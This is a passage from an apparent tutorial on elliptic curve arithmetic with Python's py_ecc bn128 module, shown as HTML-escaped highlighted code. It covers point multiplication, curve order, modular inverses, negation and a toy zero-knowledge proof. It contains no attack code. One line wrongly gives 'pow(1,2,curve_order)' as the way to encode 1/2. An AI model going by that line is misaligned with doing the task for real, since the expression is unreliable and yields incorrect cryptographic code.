&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;multiply&lt;&#x2F;span&gt;&lt;span&gt;(G1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;#(1368015179489954701390400359078579693043519447331113978918064868415326638035, 9918110051302171585080402603319702774565515993150576347155970296011118125764)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# 10G + 11G = 21G
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;eq&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;add&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;multiply&lt;&#x2F;span&gt;&lt;span&gt;(G1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;multiply&lt;&#x2F;span&gt;&lt;span&gt;(G1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;11&lt;&#x2F;span&gt;&lt;span&gt;))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;multiply&lt;&#x2F;span&gt;&lt;span&gt;(G1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;21&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;generate one thousand point in front&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;matplotlib&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;pyplot &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;plt
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;py_ecc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;bn128 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;G1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;multiply&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;neg
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;math
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;numpy &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;np
&lt;&#x2F;span&gt;&lt;span&gt;xs &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[]
&lt;&#x2F;span&gt;&lt;span&gt;ys &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[]
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#88c0d0;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1000&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    xs&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;append&lt;&#x2F;span&gt;&lt;span&gt;(i)
&lt;&#x2F;span&gt;&lt;span&gt;    ys&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;append&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;multiply&lt;&#x2F;span&gt;&lt;span&gt;(G1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;i)[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;]))
&lt;&#x2F;span&gt;&lt;span&gt;    xs&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;append&lt;&#x2F;span&gt;&lt;span&gt;(i)
&lt;&#x2F;span&gt;&lt;span&gt;    ys&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;append&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;neg&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;multiply&lt;&#x2F;span&gt;&lt;span&gt;(G1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;i))[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;]))
&lt;&#x2F;span&gt;&lt;span&gt;plt&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;scatter&lt;&#x2F;span&gt;&lt;span&gt;(xs&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;ys&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;marker&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&amp;#39;.&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;plt&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;show&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Addition in a finite field is homomorphic to addition among elliptic curve points (when their order is equal). Because of the discrete logarithm, another party can add elliptic curve points together without knowing which field elements generated those points.&lt;&#x2F;p&gt;
&lt;p&gt;The &lt;strong&gt;field modulus&lt;&#x2F;strong&gt; is the modulo we do the curve over. The &lt;strong&gt;curve order&lt;&#x2F;strong&gt; is the number of points on the curve.&lt;&#x2F;p&gt;
&lt;p&gt;If you start with a point r and add the curve order o, you will get r back.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;py_ecc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;bn128 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;curve_order&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;field_modulus&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;G1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;multiply&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;eq
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;5 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# chosen randomly
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# This passes
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;eq&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;multiply&lt;&#x2F;span&gt;&lt;span&gt;(G1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;x)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;multiply&lt;&#x2F;span&gt;&lt;span&gt;(G1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;curve_order))
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# This fails
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;eq&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;multiply&lt;&#x2F;span&gt;&lt;span&gt;(G1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;x)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;multiply&lt;&#x2F;span&gt;&lt;span&gt;(G1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;field_modulus))
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The implication of this is that (x + y) mod curve_order == xG + yG.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;** &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;300 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;21
&lt;&#x2F;span&gt;&lt;span&gt;y &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;3 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;** &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;50 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;11
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# (x + y) == xG + yG
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;eq&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;multiply&lt;&#x2F;span&gt;&lt;span&gt;(G1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;y))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;add&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;multiply&lt;&#x2F;span&gt;&lt;span&gt;(G1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;x)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;multiply&lt;&#x2F;span&gt;&lt;span&gt;(G1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;y)))
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;eq&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;multiply&lt;&#x2F;span&gt;&lt;span&gt;(G1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;(x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;y) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span&gt;curve_order)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;add&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;multiply&lt;&#x2F;span&gt;&lt;span&gt;(G1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;x)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;multiply&lt;&#x2F;span&gt;&lt;span&gt;(G1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;y)))
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Even though the x + y operation will clearly “overflow” over the curve order, this doesn’t matter. The elliptic curve multiplication is implicitly executing the same operation as taking the modulus before doing the multiplication.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Encoding rational numbers: we cannot compute &lt;code&gt;multiply(G1, 1 &#x2F; 2)&lt;&#x2F;code&gt; but in a finite field, $1 &#x2F; 2$ can be meaningfully computed as the multiplicative inverse of 2. Transfer &lt;code&gt;1 &#x2F; 2 &lt;&#x2F;code&gt; to &lt;code&gt;pow(1,2,curve_order)&lt;&#x2F;code&gt; allow us to compute this.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;details-of-computing-the-modulus-of-a-fraction&quot;&gt;*Details of computing the modulus of a fraction&lt;&#x2F;h3&gt;
&lt;p&gt;For the fraction $\frac{a}{b}$ saitisfied $\gcd(a,b)=1 $ , existing a  $c = \frac{a}{b}\ mod\ x$&lt;&#x2F;p&gt;
&lt;p&gt;According to Fermat’s little theorem $a^{p-1} = 1(mod \ p)$ we could know&lt;&#x2F;p&gt;
&lt;p&gt;$$
a^{p-2}(mod\ p) = (a^{p-1}(mod\ p)*a^{-1}(mod\ p))(mod\ p) \ = a^{-1}(mod\ p)
$$&lt;&#x2F;p&gt;
&lt;p&gt;It can be further derived that&lt;&#x2F;p&gt;
&lt;p&gt;$$
\frac{a}{b} (mod\ p) = (a  b^{-1})(mod\ p) \ = (a (mod\ p) * b^{-1} (mod\ p))(mod\ p) \ = (a (mod\ p) * b^{p-2} (mod\ p))(mod\ p)
$$&lt;&#x2F;p&gt;
&lt;h3 id=&quot;every-element-has-an-inverse&quot;&gt;Every element has an inverse&lt;&#x2F;h3&gt;
&lt;p&gt;The &lt;code&gt;py_ecc&lt;&#x2F;code&gt; library supplies us with the neg function which will provide the inverse of a given element. The library encodes the “point at infinity” as a python None.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;py_ecc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;bn128 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;G1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;multiply&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;neg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;is_inf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;Z1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;add&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;eq
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# pick a field element
&lt;&#x2F;span&gt;&lt;span&gt;x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;12345678&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# generate the point
&lt;&#x2F;span&gt;&lt;span&gt;p &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;multiply&lt;&#x2F;span&gt;&lt;span&gt;(G1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;x)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# invert
&lt;&#x2F;span&gt;&lt;span&gt;p_inv &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;neg&lt;&#x2F;span&gt;&lt;span&gt;(p)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# every element added to its inverse produces the identity element
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;is_inf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;add&lt;&#x2F;span&gt;&lt;span&gt;(p&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;p_inv))
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# Z1 is just None, which is the point at infinity
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span&gt;Z1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;is None
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# special case: the inverse of the identity is itself
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;eq&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;neg&lt;&#x2F;span&gt;&lt;span&gt;(Z1)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;Z1)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;optimized-bn128&quot;&gt;optimized_bn128&lt;&#x2F;h3&gt;
&lt;p&gt;optimized_bn128 is faster while structures EC points as 3-tuples – which are harder to interpret.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;basic-zero-knowledge-proofs-with-elliptic-curves&quot;&gt;Basic zero knowledge proofs with elliptic curves&lt;&#x2F;h3&gt;
&lt;p&gt;Consider this rather trivial example:&lt;&#x2F;p&gt;
&lt;p&gt;Claim: “I know two values x and y such that x + y = 15”&lt;&#x2F;p&gt;
&lt;p&gt;Proof: I multiply x by G1 and y by G1 and give those to you as A and B.&lt;&#x2F;p&gt;
&lt;p&gt;Verifier: You multiply 15 by G1 and check that A + B == 15G1.&lt;&#x2F;p&gt;
&lt;p&gt;Here it is in python&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2e3440;color:#d8dee9;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;py_ecc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;bn128 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;G1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;multiply&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;add
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# Prover
&lt;&#x2F;span&gt;&lt;span&gt;secret_x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;5
&lt;&#x2F;span&gt;&lt;span&gt;secret_y &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;10
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;multiply&lt;&#x2F;span&gt;&lt;span&gt;(G1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;y &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#88c0d0;&quot;&gt;multiply&lt;&#x2F;span&gt;&lt;span&gt;(G1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;proof &lt;&#x2F;span&gt;&lt;span style=&quot;color:#81a1c1;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;(x&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;y&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eceff4;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;15&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#616e88;&quot;&gt;# verifier
